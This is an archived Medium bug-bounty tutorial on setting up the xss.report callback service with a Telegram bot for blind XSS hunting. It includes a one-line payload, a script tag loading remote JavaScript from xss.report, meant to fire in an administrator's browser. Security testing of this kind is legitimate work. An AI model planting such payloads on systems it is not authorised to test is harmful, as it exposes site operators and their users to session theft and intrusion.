# How to hunt for (P1, P2) Blind XSS

- **Source URL:** https://the7th.medium.com/how-to-hunt-for-p1-p2-blind-xss-87e027acd85b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250502084531/https://the7th.medium.com/how-to-hunt-for-p1-p2-blind-xss-87e027acd85b?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9516 (id 9516)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Member-only story

# How to hunt for (P1, P2) Blind XSS

2 min read3 hours ago

If you don’t have a Medium membership, you can read the full article from this -> [link](https://web.archive.org/web/20250502084531/https://the7th.medium.com/87e027acd85b?sk=e4b0f57d13056dde15bcbff5c63862dc)

Hunting for Blind XSS can be tricky because you should have a server that runs 24/7 and is ready to receive any payload fired on the admin’s screen.

So, after a lot of research and testing, I will provide the best option you can use without paying for subscriptions.

# Steps

1. Create a new account at: [https://xss.report/register](https://web.archive.org/web/20250502084531/https://xss.report/register)
2. After that, you will need to activate the Telegram bot to receive an alert when your payload fires.
3. Copy your token from the dashboard: [https://xss.report/dashboard#settings](https://web.archive.org/web/20250502084531/https://xss.report/dashboard#settings)
4. Go to [https://t.me/XssReport\_bot](https://web.archive.org/web/20250502084531/https://t.me/XssReport_bot) and select “Start Bot”
5. Then enable the bot by providing your token
6. The last step is testing the full setup
7. Copy the first payload from your payloads list on the dashboard.

Create a new file and make sure to give it the `.html` extension

```
<!-- BXSS.html -->
<script src=https://xss.report/c/username></script>
```
Then open the file in the browser. At this point, you should receive an alert from the Telegram bot.
